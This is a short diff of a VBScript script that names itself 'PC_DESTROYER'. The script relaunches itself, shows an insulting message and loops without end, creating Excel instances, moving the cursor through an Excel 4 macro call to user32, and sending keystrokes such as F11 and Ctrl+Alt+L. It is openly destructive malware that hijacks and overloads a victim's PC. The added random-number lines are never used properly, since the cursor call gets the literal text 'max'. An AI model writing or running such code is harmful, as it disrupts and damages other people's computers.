@@ -2,8 +2,13 @@
  CreateObject("WScript.Shell").Run WScript.ScriptFullName
  auto.sendkeys "UR PC IS FUCKED BY PC_DESTROYER"
  do
+    Dim max,min,rand
+    max=1000
+    min=0
+    Randomize
+    rand = Int((max-min+1)*Rnd+min)
     Dim Excel: Set Excel = WScript.CreateObject("Excel.Application") 
-    Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""0"",""0"")"
+    Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",max,max)"
     auto.sendkeys "{enter}"
     auto.sendkeys "^%l"
     auto.sendkeys "{F11}"
